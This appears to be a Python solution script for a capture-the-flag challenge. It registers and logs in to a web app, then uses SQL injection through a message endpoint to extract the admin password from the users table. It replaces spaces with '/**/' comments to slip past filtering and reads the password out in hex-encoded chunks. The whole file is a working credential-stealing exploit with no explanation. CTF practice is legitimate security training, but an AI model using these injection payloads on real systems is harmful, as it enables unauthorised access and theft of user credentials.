import json
import time

import requests

# change this to your instance
url = 'http://instance.penguin.0ops.sjtu.cn:18436'
s = requests.session()

# step1: get admin pwd
auth = {
    "name": "rainhurt",
    "password": "12345",
}
r = s.post(url+'/api/register', json=auth)
print(r.text)
time.sleep(1)
r = s.post(url+'/api/login', json=auth)
print(r.text)

pwd = ''


def get_pwd(i):
    time.sleep(1)
    r = s.post(url+'/api/message', json={
        "message": f"0'+(select hex(\nsubstr(\npassword from {i} for 4)) from users where id=1)) # --".replace(' ', '/**/')
    })
    print(r.text)
    time.sleep(1)
    r = s.get(url+'/api/message')
    print(r.text)
    return bytes.fromhex(json.loads(r.text)['message']).decode()


pwd += get_pwd(1)
pwd += get_pwd(5)
pwd += '-'
pwd += get_pwd(10)
pwd += '-'
pwd += get_pwd(15)
pwd += '-'
pwd += get_pwd(20)
pwd += '-'
pwd += get_pwd(25)
pwd += get_pwd(29)
pwd += get_pwd(33)

print('pwd: ', pwd)
